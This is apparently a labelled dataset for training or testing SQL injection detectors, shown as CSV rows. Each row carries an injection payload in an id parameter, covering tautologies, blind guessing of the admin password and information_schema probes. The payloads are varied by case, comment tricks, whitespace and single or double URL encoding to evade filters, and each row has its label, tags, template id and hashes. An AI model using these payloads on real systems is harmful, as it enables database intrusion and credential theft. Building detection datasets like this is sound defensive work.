id%3D1%27+AND (SELECT+COUNT(*)+FROM+(SELECT+1)t)%3E0 %23,1,sqli_nested,comment_url_hash,partially_encoded,SQLI_NESTED_003,9d141009504d392befc8f4abc12e093c,7484fc80869aa60485d5f8f86b3f1d4c,56
id=1%27 And (((SELECT+password+FROM+users where+user=%27admin%27)=%27a'));--+-,1,sqli_nested,case_var|comment_semicolon_comment,partially_encoded,SQLI_NESTED_005,a18b58cdb8acaf76a166af9bf6d8bef9,9d4294fafb8f27950645e0e85e5288fd,78
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%28%28SELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2FFrom%2F%2A%2A%2Fusers%2F%2A%2A%2Fwhere%2F%2A%2A%2Fuser%3D%27admin%27%29%3D%27a%27%29%29--%2F%2A%2A%2F-,1,sqli_nested,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_NESTED_005,cbc9dfbb0d0566f1f73a609f0c242212,590a830a36857e804d34d62219952f43,185
id=1' Or (((1=1))) ;-- -,1,sqli_nested,case_var|comment_semicolon_comment,raw,SQLI_NESTED_002,1c6e565dc627ecda4289e646c361f97a,f3e463e36934ffb738d73afb680fa6b7,24
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2528%2528%25281%253D1%2529%2529%2529%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_nested,case_var|comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_NESTED_002,00b772b41ebe509566ac304ae889c576,abed8a55b61abb8d3e12ebb3c9646727,140
id=1' OR ((('54'='54'))),1,sqli_nested,case_var,raw,SQLI_NESTED_004,9a2d0761ed0c200f500b3a1dc20d28ae,9aa8df6aec22f493e9246a1df79af340,24
id%3D1%27%2BAND%2B%28%28%28SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%3D%27admin%27%29%3D%27a%27%29%29,1,sqli_nested,ws_plus,url_encoded,SQLI_NESTED_005,573030aefe5a14eece7a60a7a552e5d6,5d6d295facfeac7aec850603134fb365,107
id=1'/**/aND/**/((SELECT/**/1)/**/=/**/(SELECT/**/1))/**/#,1,sqli_nested,case_var|comment_hash|ws_comment_ws,raw,SQLI_NESTED_001,5e7b48892452f7bdf3636b99d4165173,6c10b3bee7f07522a217b37964a58e10,58
id=1'	AND	(SELECT	COUNT(*)	frOM	(SELECT	1)t)>0	--	-,1,sqli_nested,case_var|comment_dash_dash_space|ws_tab,raw,SQLI_NESTED_003,1a2b3cc4eb7d27e87b6be3f511988e06,2ad92f7601c39c5ec369fd63cb3dcfa5,51
id%3D1%27 AND+(SELECT COUNT(%2A)+FROM+(SELECT+1)t)%3E0+%23,1,sqli_nested,comment_url_hash,partially_encoded,SQLI_NESTED_003,a9727c4c7e9aa134552900dffd253557,53d9d545ae0628f0d416263423ff0c9f,58
id%3D1'	And	(SELECT	COUNT(%2A)	fROm	(SELECT	1)t)>0	--,1,sqli_nested,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_NESTED_003,56464bca37036865c3d2d93c46762742,c4691289328119aae0e77400af0e9cef,53
id=1%27  +OR+  (((1=1)))+ +%23,1,sqli_nested,case_var|comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_NESTED_002,d835dd0005bc2d490f1e557831a6908f,59473c2e95ee96ecbdbf26ba64b19b2d,30
id%3D1%27+AND+(((SELECT+password+FROM+users+Where+user%3D%27admin%27)%3D%27a'))/%2A,1,sqli_nested,case_var|comment_block_comment|ws_plus,partially_encoded,SQLI_NESTED_005,1191809fe7e1061b05ad99219d003371,573d97c92a948a88c8d00edd8a5b7015,83
id=1' OR ((('15'='15')))-- -,1,sqli_nested,case_var|comment_dash_dash_space|ws_space,raw,SQLI_NESTED_004,e661f235dae4ff65df1923d9643522b5,67f177bf3bd131174f3f409550ccaf46,28
id%3D1%27+++oR+++%28%28%28%2778%27%3D%2778%27%29%29%29%2523,1,sqli_nested,case_var|comment_url_hash|ws_mixed_ws,url_encoded,SQLI_NESTED_004,bfcd15f2f7a089cc69436aca559c0703,9ea16db5b8bf76f41ec198d9490ded81,59
id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/(SELECT/**/1)t)>0/**/#,1,sqli_nested,comment_hash|ws_comment_ws,raw,SQLI_NESTED_003,52539b5cbcf65b70a3f7f839d4800782,05e0810fe8f780326fe9fbd013319249,69
id%253D1%2527%252BOr%252B%2528%2528%2528%25275%2527%253D%25275%2527%2529%2529%2529,1,sqli_nested,case_var|ws_plus,double_encoded,SQLI_NESTED_004,4c813b55971ee517a6a87eb1190bac8d,81294c71d0b486c24677a039feeedf02,82
id%3D1%27%2BAND%2B%28%28SELECT%2B1%29%2B%3D%2B%28SELECT%2B1%29%29%2B%3B--%2B-,1,sqli_nested,comment_semicolon_comment|ws_plus,url_encoded,SQLI_NESTED_001,cf2f44ec72af5605bd121f6695a7adbd,4f5483532817b427c88167cded62a1dd,77
id%253D1%2527%2B%2Bor%2B%2B%2528%2528%2528%252792%2527%253D%252792%2527%2529%2529%2529,1,sqli_nested,case_var|ws_multi_space,double_encoded,SQLI_NESTED_004,7b08855bb4ba0276e55e227a6be61995,2146c403d6265a6c54f9e323669dde3d,86
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2B%2528SELECT%2B1%2529t%2529%253E0%2B--%2B-,1,sqli_nested,comment_dash_dash_space,double_encoded,SQLI_NESTED_003,19b4ee367ac40ed62566a9aa89ea1a3a,a368f81012adc0abf6095ce2c9470821,107
id%3D1%27	aNd	((SELECT	1)	%3D	(SELECT	1))	--,1,sqli_nested,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_NESTED_001,1a479dcd437a999a0a1a467c94c03232,95e7a3835b92710778e333f184a2cc93,44
id%3D1'%20or%20(((%2736'%3D%2736%27))),1,sqli_nested,case_var|ws_url_space,partially_encoded,SQLI_NESTED_004,eff87735d4f423e1a1dee6842506e0d0,f5108654b3081987024ccc82caf2b648,38
id%3D1%27+AND+%28%28%28SELECT+password+FROM+users+WHERE+user%3D%27admin%27%29%3D%27a%27%29%29,1,sqli_nested,standard,url_encoded,SQLI_NESTED_005,21cc6498b9bb8fd4caa10d4104448185,8d0428d28593e60b585609e98de9c905,93
id=1'  AND++(((SELECT  password +FROM  users++WHERE++user=%27admin%27)='a%27)),1,sqli_nested,ws_multi_space,partially_encoded,SQLI_NESTED_005,e67ba24406dc6f1e38f1bdc11024509a,5736b347cbbdc7c0eb89433f0c0bb179,78
id%3D1%27+AND+%28%28%28SELECT+password+From+users+wHerE+user%3D%27admin%27%29%3D%27a%27%29%29%3B--+-,1,sqli_nested,case_var|comment_semicolon_comment,url_encoded,SQLI_NESTED_005,65e5af709fb1d698a71a529836137b48,f5d31ef0ebedce8ed563e9a46fee740e,100
id=1'/**/AND/**/((SELECT/**/1)/**/=/**/(SELECT/**/1))/**/--/**/-,1,sqli_nested,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_NESTED_001,ca66c8b8a03e896659d8a4145126bc27,1f2103c3775b0a42794e524fd4552d08,64
id%3D1%27+And+((SELECT+1)+%3D+(SELECT+1))+#,1,sqli_nested,case_var|comment_hash|ws_plus,partially_encoded,SQLI_NESTED_001,18c15bc48597a4d2f8a580a51ed12f5f,15868552f6e3b3693594abb4927a84f3,43
id%3D1%27+aND+%28SELECT+COUNT%28%2A%29+From+%28SELECT+1%29t%29%3E0+%23,1,sqli_nested,case_var|comment_hash,url_encoded,SQLI_NESTED_003,b702846415be55957a628e788a74c0a7,e0d383ee853298ba962ce2f52868623b,70
id=1'%20AND%20(((SELECT%20password%20FROM%20users%20WHERE%20user='admin')='a')),1,sqli_nested,ws_url_space,raw,SQLI_NESTED_005,4bff8c27514b1de74b26aeb27deac33f,f652fffbfba392229089896a4b47f3d0,79
id%3D1%27%09AND%09%28%28%28SELECT%09password%09from%09users%09WhErE%09user%3D%27admin%27%29%3D%27a%27%29%29%2F%2A,1,sqli_nested,case_var|comment_block_comment|ws_tab,url_encoded,SQLI_NESTED_005,ac176fff0f2af794fe1c18bd1eb42b35,f481fab8a33cb34528c432fcce6f1e08,113
id%3D1%27%2520AND%2520%28SELECT%2520COUNT%28%2A%29%2520FROM%2520%28SELECT%25201%29t%29%3E0%2520%2523,1,sqli_nested,comment_url_hash|ws_url_space,url_encoded,SQLI_NESTED_003,1483fec2b53ea306779d1fbf8c686469,2726ec5504060f0184009dfcdcd89b84,100
id=1' AND+(((SELECT password+FROM users WHERE user='admin%27)=%27a')),1,sqli_nested,standard,partially_encoded,SQLI_NESTED_005,933ae9180acac5a2bd9aa0bd0e21e097,457ac986b2c91d765df78e961e3573d5,69
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1%29t%29%3E0%2F%2A%2A%2F%2F%2A,1,sqli_nested,comment_block_comment|ws_comment_ws,url_encoded,SQLI_NESTED_003,c6b103bcb750d8253e121a6be5e8f799,76e002f07f940c23b1156f2b82d59bad,150
id=1%27+AND (((SELECT+password+FROM users WHERE+user%3D'admin')%3D'a')),1,sqli_nested,standard,partially_encoded,SQLI_NESTED_005,7e1a56f44f6b6a73383b0e21345397ac,358f25e511311bb540334c583b5d99b9,71
id%253D1%2527%2BOR%2B%2528%2528%2528%252729%2527%253D%252729%2527%2529%2529%2529%2523,1,sqli_nested,comment_hash,double_encoded,SQLI_NESTED_004,8f6dae105968b8e101c03fc19f65b10e,3598a2579451c20806da334842fd48f2,85
id%253D1%2527%2509AND%2509%2528SELECT%2509COUNT%2528%252A%2529%2509From%2509%2528SELECT%25091%2529t%2529%253E0%2509--,1,sqli_nested,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_NESTED_003,7159389fd38604bf2d6d78cbc5f7ea79,73fb3e165a8ce430b2df4f794d0e0593,117
id%3D1%27%09Or%09%28%28%28%2735%27%3D%2735%27%29%29%29,1,sqli_nested,case_var|ws_tab,url_encoded,SQLI_NESTED_004,b4410b68016e356a2c3da15969180e40,3bfe542b1e1ce7edf7e368dd51df9355,54
id%253D1%2527%2BOR%2B%2528%2528%25281%253D1%2529%2529%2529%2B--,1,sqli_nested,comment_dash_dash,double_encoded,SQLI_NESTED_002,3fbd986ce38218758c58026e0cffc02c,eb5d69adb07904867950c30cfba3e1f9,63
id%3D1%27+OR+%28%28%281%3D1%29%29%29+--+-,1,sqli_nested,comment_dash_dash_space|ws_space,url_encoded,SQLI_NESTED_002,c4928d34eea55c732535c81e3416783a,0cc72836f5284ce45de902aedaeb92f3,41
id%253D1%2527%2BOR%2B%2528%2528%25281%253D1%2529%2529%2529%2B%252523,1,sqli_nested,comment_url_hash,double_encoded,SQLI_NESTED_002,43cb56f9de6029341ad92ad53de4f430,1131f46458556fccb0e356f0fe6a29e2,68
id%3D1%27+And+%28SELECT+COUNT%28%2A%29+FROM+%28SELECT+1%29t%29%3E0+%2F%2A,1,sqli_nested,case_var|comment_block_comment|ws_space,url_encoded,SQLI_NESTED_003,8560c7c42cb45a3238c8015b49f29ecd,8f06deb69919db5dcd239aadd83c77b2,73
id%3D1%27++or++%28%28%281%3D1%29%29%29++%2523,1,sqli_nested,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_NESTED_002,ca8a04e37c577d306675d71f50790134,35a4ca7a69df6ae1af3ca224ea28dfbf,45
id%253D1%2527%2B%2BOr%2B%2B%2528%2528%25281%253D1%2529%2529%2529%2B%2B%252523,1,sqli_nested,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_NESTED_002,128846f40992a28186351722c6ed3e23,f2627f7a2eb3c06a7e3af3432cfaf044,77
id%253D1%2527%2B%2BOr%2B%2B%2528%2528%25281%253D1%2529%2529%2529%2B%2B--%2B%2B-,1,sqli_nested,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_NESTED_002,ba13ab85883c524ce78f06e82b937d62,2731cce4c0603d815d16225620da6e23,79
id=1'%20AND%20((SELECT%201)%20=%20(SELECT%201))%20#,1,sqli_nested,comment_hash|ws_url_space,raw,SQLI_NESTED_001,42149c32db8ed61ac985ecbac8638f03,7770fd2c6e87a8b4020036cd2921f116,51
id=1'  AND  (((SELECT  password  from  users  where  user='admin')='a')),1,sqli_nested,case_var|ws_multi_space,raw,SQLI_NESTED_005,4bbc42f29c3241c02ebe22f1769ab40c,213cc21d176bf89bc2d250fd5acba14b,72
id%3D1%27+and+(SELECT COUNT(%2A)+FRoM+information_schema.tables)%3E0+%23,1,sqli_subquery,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_SUBQUERY_003,c7a7c2b71282106f3084be0fdfadbd27,ece905998e497865e9d636fd2de9790c,72
id%3D1%27+AND+EXISTS(SELECT+*+FROM+users+WHERE+user=%27admin%27)+;--+-,1,sqli_subquery,comment_semicolon_comment,partially_encoded,SQLI_SUBQUERY_002,ee5fc5c2001485a6a44df92d229ee199,0d3676169155b4095532df1a778c94a2,70
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29%3E0+%3B--+-,1,sqli_subquery,comment_semicolon_comment,url_encoded,SQLI_SUBQUERY_003,91c16e2c3b67cf42b4f63c204996ef03,4fcc20132e0a3bba1a1d3b5e7deda581,84
id=1'/**/and/**/EXISTS(SELECT/**/*/**/From/**/users/**/WHERE/**/user='admin')/**//*,1,sqli_subquery,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_SUBQUERY_002,123293aeea98a5d05dabea0864c7f855,671306f073075145ee65ea3f17b5c52d,83
id%253D1%2527%2Band%2BEXISTS%2528SELECT%2B%252A%2Bfrom%2Busers%2BWhERe%2Buser%253D%2527admin%2527%2529%2B--%2B-,1,sqli_subquery,case_var|comment_dash_dash_space,double_encoded,SQLI_SUBQUERY_002,94562a9b376e46b7a563db11ab4a24e9,d34f32703213fe8c8edce1867c401b9c,111
id%253D1%2527%252520AND%252520%2528SELECT%252520COUNT%2528%252A%2529%252520FROM%252520information_schema.tables%2529%253E0%252520%2523,1,sqli_subquery,case_var|comment_hash|ws_url_space,double_encoded,SQLI_SUBQUERY_003,e42c960ff67b2e34c6d644ab6f430f97,b8abe8af60e9e2bb7b37cad195c6a9d7,134
id=1%27+AND+EXISTS(SELECT %2A from users+WHERE user=%27admin%27) %23,1,sqli_subquery,case_var|comment_url_hash,partially_encoded,SQLI_SUBQUERY_002,763eeca8cc6da3a0b10024644c93474c,da1875d9af0e16c15de01ee5b1dcbd32,68
id%3D1'+where id%3D(SELECT+id from users+where+user%3D%27admin'),1,sqli_subquery,case_var,partially_encoded,SQLI_SUBQUERY_004,5230e730e187d7dd232e61f4d3c3b740,afb3b195bd1d2ef005cd995639ebcd77,64
id%3D1%27+WHERE+id%3D(SELECT+id+FROM users WHERE+user=%27admin')--,1,sqli_subquery,comment_dash_dash,partially_encoded,SQLI_SUBQUERY_004,7ec63bb5680219970cdbad734128a612,f87fdb388ceb4b714002fcb77abdceee,66
id%253D1%2527%252F%252A%252A%252FwhEre%252F%252A%252A%252Fid%253D%2528SELECT%252F%252A%252A%252Fid%252F%252A%252A%252FFrom%252F%252A%252A%252Fusers%252F%252A%252A%252FWHERE%252F%252A%252A%252Fuser%253D%2527admin%2527%2529%2523,1,sqli_subquery,case_var|comment_hash|ws_comment_ws,double_encoded,SQLI_SUBQUERY_004,7848586825e6df625c2efa668a43ed90,13da9d15e2bc07840a7e56ae8c62e7e0,226
id=1'	ANd	(SELECT	password	From	users	Where	user='admin')='a'	;--	-,1,sqli_subquery,case_var|comment_semicolon_comment|ws_tab,raw,SQLI_SUBQUERY_001,7c9ca83ba1f30419364bad55b2f43e2e,ebbd8131d637400fcd9faac765dfc50b,67
id%3D1%27+WHERE+id%3D%28SELECT+id+FROM+users+WHERE+user%3D%27admin%27%29--+-,1,sqli_subquery,comment_dash_dash_space,url_encoded,SQLI_SUBQUERY_004,17b66900e50d70d2404036fa11a866df,c26cdfc48c233ef7fdad0726ecd3e98e,76
id%3D1%27+ +AND+ +(SELECT+ +COUNT(%2A)  +FROM++ information_schema.tables)>0+++#,1,sqli_subquery,comment_hash|ws_mixed_ws,partially_encoded,SQLI_SUBQUERY_003,734d6d2964f6ef1f69fc7867285f6d6a,108dd740e155181b60bfe1012f4bc538,80
id=1' WHERE id=(SELECT id FROM users WHERE user='admin'),1,sqli_subquery,standard,raw,SQLI_SUBQUERY_004,7e7d5d9cb63795774434720356e59f44,878ba01d8f0c4de6a80d58bdf7d29a9c,56
id%3D1%27+and+%28SELECT+password+from+users+where+user%3D%27admin%27%29%3D%27a%27+%2F%2A,1,sqli_subquery,case_var|comment_block_comment,url_encoded,SQLI_SUBQUERY_001,2c1429a65b9be95f0a619ab3a2c9e04e,2917c526063a02954198b944f2505504,88
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29%3E0+%2F%2A,1,sqli_subquery,comment_block_comment|ws_space,url_encoded,SQLI_SUBQUERY_003,2613bad42fa4aadf89f2fb5385de8d51,eccee23a825b98545e609fc1806f23a9,83
id%3D1%27+WHERE+id%3D%28SELECT+id+FROM+users+WHERE+user%3D%27admin%27%29,1,sqli_subquery,standard,url_encoded,SQLI_SUBQUERY_004,e24b7e7eac6d2078ea6e51e30a03fbc4,c2a51acd976f4e9a0568bd18ef62b1c4,72
id=1'	AND	(SELECT	password	FROM	users	WHERE	user='admin')='a'	#,1,sqli_subquery,comment_hash|ws_tab,raw,SQLI_SUBQUERY_001,0d130b34ec190dee98f1397afddb2322,7ceace59cac5d26c47ac919d86774107,63
id%253D1%2527%252520AND%252520EXISTS%2528SELECT%252520%252A%252520from%252520users%252520where%252520user%253D%2527admin%2527%2529%252520%2523,1,sqli_subquery,case_var|comment_hash|ws_url_space,double_encoded,SQLI_SUBQUERY_002,3066a3fb90d1bbca2a6f7cc538a32e55,59f29958192e505e41d1cc3f349f47f6,142
id=1' AND (SELECT password FROM users WHERE user='admin')='a' /*,1,sqli_subquery,comment_block_comment,raw,SQLI_SUBQUERY_001,deac98c9a8130bdb5c595347b1742a12,ec6f5817f09d6ba7d3f983c36f17bfee,64
id%253D1%2527%2509and%2509EXISTS%2528SELECT%2509%252A%2509from%2509users%2509WHERE%2509user%253D%2527admin%2527%2529%2509--,1,sqli_subquery,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_SUBQUERY_002,2f00b10a88e0d28f366ad9417103557a,8e11a9a1496444e1f85b40a7e4c600d7,123
id%253D1%2527%252520and%252520%2528SELECT%252520password%252520frOM%252520users%252520WHEre%252520user%253D%2527admin%2527%2529%253D%2527a%2527%252520--,1,sqli_subquery,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_SUBQUERY_001,4950a78b6bdaec137eacb99f074e17b0,aece6197b00c45dc2c67af3005334760,152
id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252FCOUNT%2528%252A%2529%252F%252A%252A%252FFrom%252F%252A%252A%252Finformation_schema.tables%2529%253E0%252F%252A%252A%252F%2523,1,sqli_subquery,case_var|comment_hash|ws_comment_ws,double_encoded,SQLI_SUBQUERY_003,ad3a31c99c75b0b223842b9eda926e84,ab7c65feb72a74e969e9c8b495b47784,212
id%253D1%2527%2BAnd%2B%2528SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%253D%2527a%2527%2B%252F%252A,1,sqli_subquery,case_var|comment_block_comment,double_encoded,SQLI_SUBQUERY_001,655c40b408e758fe9adefdc75a4beaaf,77e9851452649e5a23cf8df8a77c4d47,128
id=1' where id=(SELECT id FrOm users where user='admin')--,1,sqli_subquery,case_var|comment_dash_dash|ws_space,raw,SQLI_SUBQUERY_004,908d1e4a33791645b056ce0e27a84bcf,dec912918093d9945e0b4d85db9d00bd,58
id%3D1%27+and+EXISTS(SELECT+%2A+from users+where user='admin')+--+-,1,sqli_subquery,case_var|comment_dash_dash_space,partially_encoded,SQLI_SUBQUERY_002,5e173259f7558dbcbeb7cf9b66b46961,6c588ca7547d0e43516db61d30eb4d7e,67
id=1%27+and+(SELECT+password+fRoM users+WHERE+user%3D%27admin%27)%3D%27a%27 %23,1,sqli_subquery,case_var|comment_url_hash,partially_encoded,SQLI_SUBQUERY_001,d552ec9d393fcffa73e401b541dcd833,848281dc0db2007974e258bc18fa017f,79
id=1' And (SELECT COUNT(*) From information_schema.tables)>0 %23,1,sqli_subquery,case_var|comment_url_hash,raw,SQLI_SUBQUERY_003,0c6158d6caa9014d99d2c5fe2a538813,6ed362a2da8c67c826511f8178d8d4a2,64
id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- -,1,sqli_subquery,comment_dash_dash_space,raw,SQLI_SUBQUERY_003,1624177c375d6ff995ba76bbc313bebf,b888eb1edb05b78dc2419b4d9a838cbd,65
id=1%27+AND+EXISTS(SELECT+%2A+FROM+users WHERE user='admin')+%23,1,sqli_subquery,comment_hash|ws_space,partially_encoded,SQLI_SUBQUERY_002,4b4fa7e03ce4b1ea9c43dd3994703043,0922a7ab4b83bfd29195d87235a1c4b4,64
id=1'%20wHere%20id=(SELECT%20id%20fROm%20users%20WHERE%20user='admin'),1,sqli_subquery,case_var|ws_url_space,raw,SQLI_SUBQUERY_004,1c33f816b57de4dd39889556bbd8e747,e5fc7715c54e7cfae614f3756066110b,70
id%253D1%2527%2509anD%2509%2528SELECT%2509password%2509From%2509users%2509Where%2509user%253D%2527admin%2527%2529%253D%2527a%2527%2509%253B--%2509-,1,sqli_subquery,case_var|comment_semicolon_comment|ws_tab,double_encoded,SQLI_SUBQUERY_001,5cecdfcb9cf1d8b157cdc629aa79209a,657099c02ad3e7ab1066373118754951,147
id=1' WHERE id=(SELECT id FROM users WHERE user='admin');-- -,1,sqli_subquery,case_var|comment_semicolon_comment,raw,SQLI_SUBQUERY_004,64912a8470a63c2c92ef5f9a16ad308e,c4bbef1aca2fe6810b24a9eefb8b16e7,61
id%3D1%27%2BaND%2B%28SELECT%2BCOUNT%28%2A%29%2Bfrom%2Binformation_schema.tables%29%3E0%2B%2F%2A,1,sqli_subquery,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_SUBQUERY_003,34bf3a56e9e65e550142de46884bbb14,7c24046484c0b2e0c266d0cfd34d72c1,95
id%3D1%27%2F%2A%2A%2FWHERE%2F%2A%2A%2Fid%3D%28SELECT%2F%2A%2A%2Fid%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fuser%3D%27admin%27%29,1,sqli_subquery,ws_mixed_ws,url_encoded,SQLI_SUBQUERY_004,e9e55e9db75a4d6d0c6cca359d2f55ff,d6c3e9eaeab3c19329273e3314cfd4d1,149
id%253D1%2527%2BAND%2BEXISTS%2528SELECT%2B%252A%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2B%252523,1,sqli_subquery,comment_url_hash,double_encoded,SQLI_SUBQUERY_002,07ac7b746892925109f14ae173503b80,36e0a811be001fea518544cad434751d,112
id=1'%20WHERE%20id=(SELECT%20id%20From%20users%20WHERE%20user='admin')--,1,sqli_subquery,case_var|comment_dash_dash|ws_url_space,raw,SQLI_SUBQUERY_004,99762e47ea949044dd61a18738813853,7c2543b4511d3a97e6c71d98b1161d25,72
id=1%27	AND	EXISTS(SELECT	%2A	FROM	users	WHERE	user=%27admin%27)	#,1,sqli_subquery,comment_hash|ws_tab,partially_encoded,SQLI_SUBQUERY_002,704ec01561a42d5e08944280a03952ad,31582db64a9208cba8eb0c563618d5b1,66
id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables)>0%20;--%20-,1,sqli_subquery,comment_semicolon_comment|ws_url_space,raw,SQLI_SUBQUERY_003,881afe6e5101785a49558083709b9ec3,b310eb0c6122db00ce9243c62f7233d1,80
id=1' And (SELECT COUNT(*) FROM information_schema.tables)>0 --,1,sqli_subquery,case_var|comment_dash_dash,raw,SQLI_SUBQUERY_003,e6dc124190fca1b3c641065ef464c9cd,7ad9b564fb4dc9ebf4b410dc7eeb69fa,63
id%253D1%2527%2B%2BAND%2B%2BEXISTS%2528SELECT%2B%2B%252A%2B%2BfRoM%2B%2Busers%2B%2BWHERE%2B%2Buser%253D%2527admin%2527%2529%2B%2B%252523,1,sqli_subquery,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_SUBQUERY_002,adcc53078b7f62e43b49ba70f1dbc96b,d6e8e67d47d2de2091d8eab9a40ef710,136
id%253D1%2527%2BWHERE%2Bid%253D%2528SELECT%2Bid%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%252523,1,sqli_subquery,comment_url_hash,double_encoded,SQLI_SUBQUERY_004,44b1e4ac841bd79d1564cc6189550c32,565779db77736c447cab89b7e12dff32,109
id%253D1%2527%2BAND%2BEXISTS%2528SELECT%2B%252A%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2B%253B--%2B-,1,sqli_subquery,comment_semicolon_comment,double_encoded,SQLI_SUBQUERY_002,66912389952eb641bc359a4c395d50e3,869667c99e6f4817d1e71b66f0cf4266,116
id%3D1%27%2F%2A%2A%2Fwhere%2F%2A%2A%2Fid%3D%28SELECT%2F%2A%2A%2Fid%2F%2A%2A%2FFrom%2F%2A%2A%2Fusers%2F%2A%2A%2FWhere%2F%2A%2A%2Fuser%3D%27admin%27%29--%2F%2A%2A%2F-,1,sqli_subquery,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_SUBQUERY_004,f5b3c875762cd4bcdb05f6d5eb6a6fa6,15ef2e1ccb90ddb8ff01cb8fda3a9299,164
id%253D1%2527%2BWHERe%2Bid%253D%2528SELECT%2Bid%2Bfrom%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%253B--%2B-,1,sqli_subquery,case_var|comment_semicolon_comment,double_encoded,SQLI_SUBQUERY_004,744930898dcf0b41ad544c1b8e213e65,2b2105cf39c2d7673567c699b13abb6e,113
id%3D1' AND+(SELECT+password+FROM users+WHERE+user%3D%27admin')=%27a'+%2F%2A,1,sqli_subquery,comment_block_comment,partially_encoded,SQLI_SUBQUERY_001,fdafd8ab8657ef98fea4ea43ffd3f945,69c7f4c5b46540f5cf70f2823674e6aa,76
id=1' AND EXISTS(SELECT * FROM users WHERE user='admin') /*,1,sqli_subquery,comment_block_comment|ws_space,raw,SQLI_SUBQUERY_002,541404a5f4669bc325ba50b44a0f679a,91550a280c2557a084c1d5e9e880dd98,59
id%253D1%2527%252Band%252BEXISTS%2528SELECT%252B%252A%252BFRom%252Busers%252Bwhere%252Buser%253D%2527admin%2527%2529%252B%252F%252A,1,sqli_subquery,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_SUBQUERY_002,9fe7fe3ec29a932441e07cfa5a0bee00,94a0b7ade7d92c935432ed56e189f3aa,131
id=1'+ AND++(SELECT++password +from +users++WHERE++user='admin%27)%3D'a%27++#,1,sqli_subquery,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_SUBQUERY_001,ebc53b1b97a9d74f0969cc0ceced5db5,096b2685c0c15b5d942396c745c40eff,77
id=1%27+AND (SELECT+COUNT(%2A) FROM+information_schema.tables)%3E0+--,1,sqli_subquery,comment_dash_dash,partially_encoded,SQLI_SUBQUERY_003,6600fd90fd7a207970bb0dd8dc8ee16b,7673b0aa544d387209526bb14c3c0b35,69
id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BfRoM%2Binformation_schema.tables%29%3E0%2B%23,1,sqli_subquery,case_var|comment_hash|ws_plus,url_encoded,SQLI_SUBQUERY_003,7e468d5425ed72052c8c11ccbd34a558,6e6246367ccbf98d17e4236b93415902,92
id=1' AND EXISTS(SELECT * FROM users WHERE user='admin') --,1,sqli_subquery,comment_dash_dash,raw,SQLI_SUBQUERY_002,4d8db8c0fdb74eba70c4ff3d537a2ea0,a31b6bae8a5d890ef62b510595bfaef3,59
id%3D1'+And+(SELECT+password+FrOm+users+WHERE+user%3D%27admin%27)%3D%27a'+%3B--+-,1,sqli_subquery,case_var|comment_semicolon_comment,partially_encoded,SQLI_SUBQUERY_001,a321f736fc4619cee773701b47b21b88,b3fb5214a46f9ae88868f551b64c8264,81
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2Binformation_schema.tables%2529%253E0%2B--%2B-,1,sqli_subquery,comment_dash_dash_space,double_encoded,SQLI_SUBQUERY_003,aa1b48d31b638e2e9862c2ecc50624d6,d2ec513f0e3c8118aae858459389cbd5,111
id=1'%20AND%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20user='admin')%20#,1,sqli_subquery,comment_hash|ws_url_space,raw,SQLI_SUBQUERY_002,f73c2dd5e8f78d07d76911327931aec6,d3ff18829fed22d4fe99fc95e2c07873,74
id=1'+WHERE+id=(SELECT+id+FROM+users+WHERE+user='admin')--+-,1,sqli_subquery,comment_dash_dash_space|ws_plus,raw,SQLI_SUBQUERY_004,07dd5687b7c48fff6aff15ef39decfcc,52065194216525735c79e9a9df4a149e,60
id%3D1%27+AND+%28SELECT+password+FROM+users+WHERE+user%3D%27admin%27%29%3D%27a%27+--+-,1,sqli_subquery,comment_dash_dash_space,url_encoded,SQLI_SUBQUERY_001,02653b473f4c5ec5fcb845ff29e6a9c6,11e9a9642f5f7e8ad37ef7abda49358a,86
